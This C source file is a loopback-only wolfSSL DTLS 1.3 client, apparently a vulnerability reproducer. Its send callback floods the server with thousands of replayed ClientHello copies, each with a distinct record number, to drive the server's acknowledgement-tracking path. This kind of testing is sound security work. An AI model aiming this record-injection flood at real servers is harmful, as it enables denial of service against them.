/*
 * Loopback-only DTLS 1.3 client with a wolfSSL IO send callback.
 *
 * The callback sends the real ClientHello on the real connected UDP fd, then
 * injects COUNT copies with distinct 64-bit record numbers on that same fd.
 * This exercises the real server's Dtls13RecordRecvd -> Dtls13RtxAddAck chain
 * without editing any pinned wolfSSL source. All traffic stays on 127.0.0.1.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#include <wolfssl/options.h>
#include <wolfssl/ssl.h>
#include <wolfssl/wolfio.h>

#ifndef INJECT_COUNT
#define INJECT_COUNT 4097
#endif

static int g_fd = -1;
static int g_injected = 0;
static int g_count = INJECT_COUNT;
static unsigned char g_ch[65535];
static int g_ch_len = 0;

static int inject_send_cb(WOLFSSL* ssl, char* buf, int sz, void* ctx)
{
    int fd, n, seq;
    (void)ssl;
    (void)ctx;
    fd = g_fd;
    n = (int)send(fd, buf, (size_t)sz, 0);
    if (n != sz)
        return n;

    if (!g_injected && sz > 13 && (unsigned char)buf[0] == 22 &&
            (unsigned char)buf[1] == 0xfe && sz <= (int)sizeof(g_ch)) {
        memcpy(g_ch, buf, (size_t)sz);
        g_ch_len = sz;
        for (seq = 1; seq <= g_count; ++seq) {
            unsigned long long u = (unsigned long long)seq;
            unsigned char pkt[65535];
            memcpy(pkt, g_ch, (size_t)g_ch_len);
            pkt[3] = 0;
            pkt[4] = 0; /* epoch 0 */
            pkt[5] = (unsigned char)(u >> 40);
            pkt[6] = (unsigned char)(u >> 32);
            pkt[7] = (unsigned char)(u >> 24);
            pkt[8] = (unsigned char)(u >> 16);
            pkt[9] = (unsigned char)(u >> 8);
            pkt[10] = (unsigned char)u;
            {
                int ir = (int)send(fd, pkt, (size_t)g_ch_len, 0);
                if (ir != g_ch_len) {
                    printf("FACT inject_short seq=%d ret=%d errno=%d\n",
                           seq, ir, errno);
                    break;
                }
            }
            if (seq % 500 == 0)
                printf("FACT inject_sent=%d\n", seq);
        }
        printf("FACT inject_done ch_len=%d count=%d\n", g_ch_len, seq - 1);
        fflush(stdout);
    }
    return n;
}

int main(int argc, char** argv)
{
    int port, fd, i, ret = -1, ur;
    struct sockaddr_in addr;
    struct timeval tv;
    WOLFSSL_CTX* ctx;
    WOLFSSL* ssl;
    char rbuf[64];

    if (argc != 2 && argc != 3) {
        fprintf(stderr, "usage: loopback_inject_client PORT [INJECT_COUNT]\n");
        return 2;
    }
    port = atoi(argv[1]);
    if (argc == 3)
        g_count = atoi(argv[2]);
    if (wolfSSL_library_init() != WOLFSSL_SUCCESS)
        return 2;
    ctx = wolfSSL_CTX_new(wolfDTLSv1_3_client_method());
    if (ctx == NULL)
        return 2;
    wolfSSL_CTX_set_verify(ctx, WOLFSSL_VERIFY_NONE, 0);
    wolfSSL_CTX_SetIOSend(ctx, inject_send_cb);
    ssl = wolfSSL_new(ctx);
    if (ssl == NULL)
        return 2;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0)
        return 2;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    addr.sin_port = htons((unsigned short)port);
    if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) != 0)
        return 2;
    g_fd = fd;
    tv.tv_sec = 0;
    tv.tv_usec = 1000;
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if (wolfSSL_set_fd(ssl, fd) != WOLFSSL_SUCCESS)
        return 2;
    for (i = 0; i < 400; ++i) {
        ret = wolfSSL_connect(ssl);
        if (ret == WOLFSSL_SUCCESS)
            break;
        usleep(5000);
    }
    printf("FACT inject_client_connect_ret=%d tries=%d injected=%d\n",
           ret, i + 1, g_injected);
    fflush(stdout);
    if (ret == WOLFSSL_SUCCESS) {
        for (i = 0; i < 3; ++i) {
            ur = (int)wolfSSL_read(ssl, rbuf, (int)sizeof(rbuf));
            printf("FACT read_i=%d ret=%d\n", i, ur);
            if (ur <= 0)
                break;
        }
    }
    (void)ur;
    wolfSSL_free(ssl);
    wolfSSL_CTX_free(ctx);
    close(fd);
    return ret == WOLFSSL_SUCCESS ? 0 : 1;
}
